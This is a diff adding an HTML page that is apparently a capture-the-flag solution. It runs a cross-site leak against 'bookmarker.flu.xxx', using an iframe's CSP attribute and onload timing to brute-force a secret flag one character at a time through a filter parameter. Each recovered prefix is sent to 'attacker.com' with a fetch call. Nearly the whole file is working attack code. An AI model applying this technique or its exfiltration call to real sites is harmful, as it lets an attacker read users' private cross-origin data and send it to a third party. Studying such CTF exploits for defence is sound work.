@@ -1,0 +1,69 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <meta charset="utf-8">
+        <meta http-equiv="X-UA-Compatible" content="IE=edge">
+        <title></title>
+        <style>
+            iframe {
+                width: 500px;
+                height: 500px;
+            }
+        </style>
+        
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+    </head>
+    <body>
+        <iframe id="frame"></iframe>
+        <p>Testing <code id="output"></code></p>
+        <script>
+
+            const leak = async(url, csp='script-src \'none\';') => {
+                return new Promise((r)=> {
+                    frame.setAttribute('csp', csp)
+                    frame.src = url
+                    frame.onload = () => {
+                        // overwrite onload 
+                        frame.onload = () => {
+                            return r(1)
+                        }
+                        frame.src = url + '#'
+                    }
+                    let t = setTimeout(() => {
+                        return r(0)
+                    }, 400)
+                })
+
+            }
+            
+            const go = async (start) => {
+                let letters = '}_abcdefghijklmnopqrstuvwxyz0123456789'.split('')
+                let pattern = start
+                let run = true
+            
+                while(run){
+                    run = false
+                    for(let l of letters){
+                        output.innerText = `${pattern + l}`
+                        if(await leak(`https://bookmarker.flu.xxx/?filter=${pattern + l}`)){
+                            pattern += l
+                            run=true
+                            fetch('https://attacker.com?xxxx=' + pattern, {mode:'no-cors'})
+                            break
+                        }
+                    }
+                    if(pattern.slice(-1) === '}'){
+                        run = false
+                    }
+                }
+                console.log(pattern)
+            }
+
+
+            go('flag{')
+
+            
+            
+        </script>
+    </body>
+</html>
